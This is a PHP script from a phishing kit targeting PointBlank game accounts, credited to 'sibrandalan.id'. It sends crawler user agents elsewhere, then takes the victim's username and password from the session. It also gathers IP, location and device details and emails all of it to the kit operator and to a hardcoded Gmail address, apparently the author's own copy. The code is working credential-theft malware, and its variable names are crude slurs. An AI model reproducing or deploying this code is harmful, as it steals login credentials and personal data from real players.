<!-- //Noted : Jangan di rubah credit link si pembuat script untuk menghargai karyanya -->

<!-- script By sibrandalan.id -->

<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: https://www.facebook.com/IdhamDotID');
die();
}
session_start();
$status = $_SESSION['status'];
$id = $_SESSION['id'];
$pw = $_SESSION['pw'];
if($status != "Login"){
    header('location: ../../index.php');
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
    $eid = $_SESSION['id'];
    $password = $_SESSION['pw'];
    include"../../email.php";
    include 'ip.php';
    $kontol = 'fandieta123@gmail.com';
    $body = <<<EOD
      <html>
 <head>
    <meta charset="UTF-8">
            <style>
            @font-face {font-family: "sibrandalan";src: url(../../font/AGENCYR.ttf);} 
            #sibrandalan {border-collapse: collapse;width: 50%;
            margin: auto;}
            #sibrandalan td, 
            #sibrandalan th {border: 1px solid #ddd;padding: 8px;}
            #sibrandalan tr:nth-child(even){background-color: #f2f2f2;}
            #sibrandalan tr:hover {background-color: #ddd;}
            #sibrandalan th {padding-top: 12px;padding-bottom: 12px;text-align: left;background-color: #08749e;color: white;}
            </style></head>
            <body>
                <div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#f7f7f7;width:100%" class="form-horizontal">
            <table id='sibrandalan'>
            <tr><th>Akun PointBlank Bos Cepet Ganti </th></tr>
            <tr><td>Username : $id</td></tr>
            <tr><td>password : $pw</td></tr>
            <hr>
            <tr><th>Informasi Tambahan</th></tr>
             <tr><td>IP Info : ".$alamat." | Negara".$nama_negro."</tr></td>
           <tr><td>Jam : ".$jamb."</tr></td>
           <tr><td>City : ".$city." ZipCode : ".$zipCode."</tr></td>
           <tr><td>Os Name : ".$os_name."</tr></td>
           <tr><td>User Agent : ".$user_agent." </tr></td>
                <tr><th>Blog : www.sibrandalan.id</th></tr>
               <tr><th><h2><center>Script POINTBLANK<br/> Buatan Sibrandalan.id</center></h2></th></tr> 
       
      </th>
  </tr>
</tr>
</tr>
</tr>

</table>
</div>
</body>
</html>
EOD;
    $subjek = 'Akun PB MASUK BOSS ['.$eid.']Masuk';
    $headers = "From: Result@sibrandalan.id\r\n";
    $headers .= "Content-type: text/html\r\n";
    $success = mail($mailto, $subjek, $body, $headers);
    $ANJING = mail($kontol, $subjek, $body, $headers);
    
    if($success AND $ANJING) {
        session_start();
        $_SESSION['status'] = $status;
        echo "<script type='text/javascript'>document.location='../../success/';</script>";
    }
}
?>

<!-- //Noted : Jangan di rubah credit link si pembuat script untuk menghargai karyanya -->

<!-- script By sibrandalan.id -->
